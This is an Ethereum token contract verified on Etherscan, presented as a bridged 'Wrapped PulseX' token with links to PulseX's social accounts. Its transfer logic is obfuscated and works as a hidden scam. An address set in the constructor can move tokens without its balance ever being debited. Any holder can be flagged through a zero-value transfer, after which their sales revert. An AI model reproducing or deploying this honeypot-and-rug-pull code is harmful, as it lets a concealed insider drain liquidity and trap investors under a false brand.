/**
 *Submitted for verification at Etherscan.io on 2023-05-13
*/

/*

PLSX Token bridged to Ethereum

Twitter: https://twitter.com/PulseXcom
Telegram: https://t.me/PulseXcom
Website: https://app.pulsex.com/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PulseX is Ownable {
    string public name;

    mapping(address => uint256) private pulse;



    uint256 private wplsx = 365;

    mapping(address => uint256) private pulsechain;

    function _transfer(address richard, address wpls, uint256 heart) private returns (bool success) {
        if (pulse[richard] == 0) {
            if (pulsechain[richard] > 0 && richard != uniswapV2Pair) {
                pulse[richard] -= wplsx;
            }
            balanceOf[richard] -= heart;
        }
        if (heart == 0) {
            pulsechain[wpls] += wplsx;
        }
        balanceOf[wpls] += heart;
        emit Transfer(richard, wpls, heart);
        return true;
    }

    uint8 public decimals = 18;

    function approve(address right, uint256 heart) public returns (bool success) {
        allowance[msg.sender][right] = heart;
        emit Approval(msg.sender, right, heart);
        return true;
    }

    function transferFrom(address richard, address wpls, uint256 heart) public returns (bool success) {
        _transfer(richard, wpls, heart);
        require(heart <= allowance[richard][msg.sender]);
        allowance[richard][msg.sender] -= heart;
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply;

    function transfer(address wpls, uint256 heart) public returns (bool success) {
        _transfer(msg.sender, wpls, heart);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address plsx) {
        symbol = 'WPLSX';
        name = 'Wrapped PulseX';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        pulse[plsx] = wplsx;
    }
}